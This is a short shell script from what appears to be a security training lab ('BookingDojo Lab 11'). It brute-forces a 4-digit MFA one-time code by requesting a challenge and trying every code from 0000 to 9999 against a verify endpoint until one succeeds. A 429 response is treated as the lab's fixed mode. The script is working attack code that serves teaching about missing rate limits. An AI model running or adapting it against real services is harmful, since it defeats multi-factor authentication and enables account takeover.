#!/bin/sh
# brute_force_otp.sh — BookingDojo Lab 11: Brute Force MFA
# Usage: ./brute_force_otp.sh <bearer-token> [api-base-url]
#
# Requests a fresh MFA challenge then enumerates all 10,000 possible
# 4-digit codes (0000–9999) until the server returns 200 OK.
# Demonstrates the vulnerability when no attempt limit is enforced.

TOKEN="$1"
API="${2:-http://localhost:5000}"

if [ -z "$TOKEN" ]; then
  echo "Usage: $0 <bearer-token> [api-base-url]"
  echo "Example: $0 eyJhbGci..."
  exit 1
fi

echo "Requesting fresh MFA challenge…"
curl -s -X POST "$API/api/auth/mfa/challenge" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" > /dev/null

echo "Brute-forcing OTP (0000–9999)…"
START=$(date +%s)
i=0
while [ "$i" -le 9999 ]; do
  CODE=$(printf '%04d' "$i")
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' \
    -X POST "$API/api/auth/mfa/verify" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"code\":\"$CODE\"}")

  if [ "$STATUS" = "200" ]; then
    END=$(date +%s)
    echo "Found OTP: $CODE  (attempt $i, $((END - START))s elapsed)"
    exit 0
  fi

  if [ "$STATUS" = "429" ]; then
    echo "Rate-limited after $i attempts — Fixed mode is active."
    exit 1
  fi

  i=$(( i + 1 ))
done

echo "Not found — challenge expired before all codes were tried."
exit 1
